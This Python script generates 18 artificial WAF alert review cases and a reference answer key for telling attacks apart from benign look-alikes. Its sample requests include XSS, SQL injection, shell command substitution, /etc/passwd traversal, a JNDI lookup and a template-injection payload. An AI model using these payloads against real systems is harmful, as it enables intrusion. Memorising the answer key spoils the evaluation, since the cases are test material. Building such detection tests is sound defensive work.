"""Build neutral, artificial review cases without network/model/payload execution.

Default: verify checked-in files. --emit-patch: print new files for apply_patch.
This script never writes files. Reference rationales are not upload fields.
"""
import argparse
import hashlib
import json
from pathlib import Path
from urllib.parse import urlencode


ROOT = Path(__file__).resolve().parents[1]
DIRECTORY = "samples/waf-context-review-v1"


def compact(value):
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def request(method, target, body=None, headers=()):
    values = ["Host: example.invalid", "User-Agent: HTTPClient/1.0", *headers]
    text = "" if body is None else compact(body)
    if body is not None:
        values += ["Content-Type: application/json", f"Content-Length: {len(text.encode('utf-8'))}"]
    return f"{method} {target} HTTP/1.1\r\n" + "\r\n".join(values) + "\r\n\r\n" + text


def query(path, **values):
    return path + "?" + urlencode(values)


def build():
    events, answers = [], []

    def add(group, verdict, title, payload, rationale, *, condition=None, signature="Input pattern"):
        # Opaque, reproducible IDs contain no category or answer hints.
        digest = hashlib.sha256(f"context-review-v1:{len(events)}".encode()).hexdigest()[:16]
        event_id = f"evt-{digest}"
        events.append({
            "event_id": event_id, "company_name": "Example Services",
            "src_ip": "192.0.2.41", "dest_ip": "198.51.100.23",
            "src_port": 43122, "dest_port": 443, "payload": payload,
            "signature": signature, "event_name": "Request content",
            "waf_vendor": "generic", "waf_action": "D", "expected_verdict": verdict,
        })
        answers.append({
            "event_id": event_id, "group": group, "title_ko": title,
            "expected_verdict": verdict, "rationale_ko": rationale,
            "missing_condition_ko": condition,
        })

    tp, fp, hold = "true_positive", "false_positive", "inconclusive"
    add("html", tp, "시그니처와 다른 스크립트 삽입",
        request("GET", query("/search", q="<svg onload=alert(1)>")),
        "검색 값에 SVG 이벤트 핸들러와 실행 식을 삽입했다. SQL 시그니처 불일치나 렌더링 성공 미확인은 이 공격 시도를 부정하지 않는다.",
        signature="SQL UNION SELECT")
    add("html", fp, "이벤트 이름과 닮은 일반 파일명",
        request("GET", query("/search", q="onload-chart.svg")),
        "파일명에는 이벤트 이름과 확장자만 있다. 태그·속성 할당·실행 식이 없는 검색 값이다.",
        signature="SQL UNION SELECT")
    add("sql", fp, "성명 안의 작은따옴표",
        request("POST", "/contacts/search", {"name": "O'Reilly"}),
        "성명 검색 값의 작은따옴표이며 조건식·주석·별도 조회를 만드는 구문이 없다.")
    add("sql", tp, "JSON 인증 입력의 참 조건 삽입",
        request("POST", "/session", {"username": "' OR 4=4 --", "password": "", "display_only": True}),
        "사용자명에 문자열 종료·참 조건·주석을 조합해 인증 조건을 바꾸려 한다. JSON 따옴표나 클라이언트의 표시용 플래그는 정상 처리의 증명이 아니다.")
    add("shell", tp, "JSON 파일명 안의 명령 치환",
        request("POST", "/reports/export", {"filename": "report_$(id).txt", "format": "text"}),
        "파일명에 셸 명령 치환 문법과 명령을 삽입했다. JSON 전달 형식과 명령 실행의 성공 여부를 공격 시도와 구분한다.")
    add("shell", fp, "일반 내보내기 파일명",
        request("POST", "/reports/export", {"filename": "report_(draft).txt", "format": "text"}),
        "괄호로 초안임을 나타낸 파일명이며 명령 치환·구분자·실행 식이 없다.")
    add("path", fp, "파일명 내부의 연속된 점",
        request("POST", "/files/read", {"file": "meeting..notes.txt"}),
        "점 두 개가 파일명 내부에 있고 상위 디렉터리 이동 세그먼트나 경로 구분자가 없다.")
    add("path", tp, "기준 디렉터리를 벗어나 시스템 파일 지정",
        request("POST", "/files/read", {"file": "../../../../etc/passwd", "display_only": True}),
        "파일 읽기 인자에 반복된 상위 경로 이동과 시스템 계정 파일을 지정했다. 표시용이라는 입력 플래그로 이 조합을 무시하지 않는다.")
    add("lookup", tp, "요청 헤더의 외부 조회식",
        request("GET", "/search?q=manual", headers=("X-Trace: ${jndi:ldap://lookup.invalid/a}",)),
        "요청 헤더에 외부 대상을 지정한 JNDI 조회식을 넣었다. 취약 Log4j의 존재·연결·침해 성공을 확인한 것은 아니다.")
    add("lookup", fp, "기술 용어를 설명하는 문서",
        request("POST", "/notes", {"title": "Directory service", "text": "JNDI can refer to LDAP directory services."}),
        "문서 내용은 기술 용어의 설명이며 조회식의 구분자나 외부 조회를 지시하는 실행 구문이 없다.")
    add("template", fp, "메일 양식의 이름 자리표시자",
        request("POST", "/mail/templates", {"subject": "Welcome", "body": "Hello {{ customer_name }}"}),
        "메일 양식에서 고객 이름을 넣는 단순 자리표시자다. 객체 내부 접근·호출·계산 등 실행 조작 구문이 없다.")
    add("template", tp, "양식 값의 내부 객체 접근과 코드 호출",
        request("POST", "/mail/templates", {"subject": "Welcome", "body": "{{ self.__init__.__globals__.__builtins__.__import__('os').getcwd() }}"}),
        "양식 값에서 내부 객체를 따라 내장 import와 운영체제 함수를 호출하려 한다. 단순 이름 자리표시자와 구분하고 실행 성공은 별도로 확인한다.")

    add("authorization", hold, "요청자와 문서 소유 관계 미확인",
        request("GET", "/documents/731?account_id=24"),
        "문서 식별자와 계정 번호만으로 타인 문서 접근인지 정상 조회인지 알 수 없다.",
        condition="인증된 요청자의 신원과 해당 문서의 소유·공유 권한")
    add("outbound_url", hold, "서버 측 내부 주소 조회의 허용 범위 미확인",
        request("POST", "/integrations/fetch", {"url": "http://127.0.0.1:8080/health"}),
        "서버 측 URL 조회 대상이 루프백 주소다. 허용된 내부 상태 조회인지 허용 범위 밖 요청인지 구분할 정책이 없다.",
        condition="해당 URL 조회 기능에서 허용하는 대상 주소·포트와 요청자의 이용 권한")
    add("custom_query", hold, "사용자 SQL 실행 기능의 허용 범위 미확인",
        request("POST", "/reports/query", {"query": "SELECT title FROM books"}),
        "직접 SQL을 받는 형태이나 정상 보고서 기능인지 허용되지 않은 조회인지 가를 권한·실행 범위가 없다.",
        condition="이 기능의 사용자 SQL 허용 여부와 요청자의 조회 범위")
    add("embedded_content", hold, "임베드 콘텐츠 허용 여부 미확인",
        request("POST", "/pages", {"content": '<iframe src="/help"></iframe>', "display_only": True}),
        "콘텐츠에 같은 사이트의 iframe을 넣었다. 명백한 실행 공격은 없지만 허용된 임베드인지 정책 위반인지 결정할 편집 규칙이 없다.",
        condition="이 콘텐츠 필드의 iframe 허용·제거 규칙과 실제 표시 방식")
    add("relative_path", hold, "상위 경로가 허용된 공유 경로인지 미확인",
        request("POST", "/files/read", {"file": "../shared/manual.pdf"}),
        "상위 경로 이동은 있지만 대상은 공유 문서 형태다. 기준 디렉터리와 허용 루트에 따라 정상 공유 접근 또는 경로 제한 위반으로 갈린다.",
        condition="서버가 적용하는 기준 디렉터리와 접근 허용 루트")
    add("job_permission", hold, "관리 작업의 실행 권한 미확인",
        request("POST", "/jobs/run", {"command": "archive", "dry_run": True}),
        "별도 명령 삽입 구문은 없지만 관리 작업의 허용 여부가 확인되지 않는다. 클라이언트의 dry_run 값만으로 실행되지 않는다고 보장할 수 없다.",
        condition="요청자의 작업 실행 권한과 서버의 허용 명령·dry_run 처리 규칙")

    # The upload order carries neither family grouping nor verdict grouping.
    return sorted(events, key=lambda row: row["event_id"]), sorted(answers, key=lambda row: row["event_id"])


def documents():
    events, answers = build()
    return {
        f"{DIRECTORY}/context_review_18.json": json.dumps(events, ensure_ascii=False, indent=2) + "\n",
        f"{DIRECTORY}/reference/answers_18.json": json.dumps(answers, ensure_ascii=False, indent=2) + "\n",
    }


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--emit-patch", action="store_true")
    args = parser.parse_args()
    files = documents()
    if args.emit_patch:
        print("*** Begin Patch")
        for path, content in files.items():
            print(f"*** Add File: {path}")
            print("\n".join("+" + line for line in content.splitlines()))
        print("*** End Patch")
    else:
        mismatched = [path for path, content in files.items()
                      if not (ROOT / path).is_file() or (ROOT / path).read_text(encoding="utf-8") != content]
        if mismatched:
            raise SystemExit("Review sample files differ from their versioned definitions.")
        print("18 review cases: checked-in files match; no payloads or model calls executed.")
